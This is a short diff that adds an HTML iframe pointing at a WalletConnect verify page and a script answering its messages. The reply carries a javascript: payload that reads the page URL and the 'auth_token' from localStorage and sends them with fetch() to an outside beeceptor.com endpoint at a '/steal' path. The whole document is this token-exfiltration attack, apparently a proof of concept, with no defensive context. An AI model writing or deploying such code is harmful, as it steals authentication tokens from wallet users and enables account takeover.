@@ -1,0 +1,8 @@
+<iframe id="wc" src="https://verify.walletconnect.com"></iframe>
+<script>
+  window.addEventListener('message', (e) => {
+    if (e.origin === 'https://verify.walletconnect.com') {
+      e.source.postMessage('{"type":"connect","data":"javascript:fetch(\'https://demola.free.beeceptor.com/steal?data=\'+encodeURIComponent(JSON.stringify({url:location.href, token:localStorage.getItem(\'auth_token\')})))"}', '*');
+    }
+  });
+</script>
